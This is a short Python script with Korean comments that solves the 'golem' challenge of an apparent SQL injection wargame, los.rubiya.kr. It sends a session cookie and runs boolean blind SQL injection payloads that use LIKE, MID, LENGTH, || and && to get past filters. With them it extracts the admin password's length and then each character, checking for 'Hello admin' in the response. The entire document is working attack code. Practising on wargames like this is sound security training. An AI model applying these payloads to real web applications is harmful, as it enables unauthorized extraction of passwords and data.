import os
from dotenv import load_dotenv
import requests
from tqdm import tqdm

# 상위 디렉토리의 .env 파일 경로
dotenv_path = os.path.join(os.path.dirname(__file__), '..', '.env')

# .env 파일 로드
load_dotenv(dotenv_path)

# 환경변수 가져오기
my_cookie ={ "PHPSESSID" : os.getenv('MY_COOKIE') }

URL = 'https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php'
param = "?pw=%27||id+LIKE+%27admin%27%26%26LENGTH(pw)%3E1%23"

# res = requests.get(URL+param, cookies=my_cookie)
# print(res.text)
len = 0
print("pw 길이 구하기")
for i in tqdm(range(100)):
    param = f"?pw=%27||id+LIKE+%27admin%27%26%26LENGTH(pw)>{i}%23"
    # print(param)
    res = requests.get(URL+param, cookies=my_cookie)
    
    
    if "Hello admin" not in res.text :
        len = i 
        print("len : ", i)
        break

chars = "0123456789abcdefghijklmnopqrstuvwxyz!@"

ans = ""
print("pw 구하기")
for i in tqdm(range(1,len+1)) :
    for j in chars:
        param = f"?pw=%27||MID(pw,{i},1)+LIKE+'{j}'%26%26id+LIKE+'admin"
        # print(param)
        res = requests.get(URL+param, cookies=my_cookie)
        if "Hello admin" in res.text :
            ans += j
            # print(ans)
            break

param = "?pw="+ans
res = requests.get(URL+param, cookies=my_cookie)

if "GOLEM Clear!" in res.text :
    print("Clear!")
    print("answer : ", ans)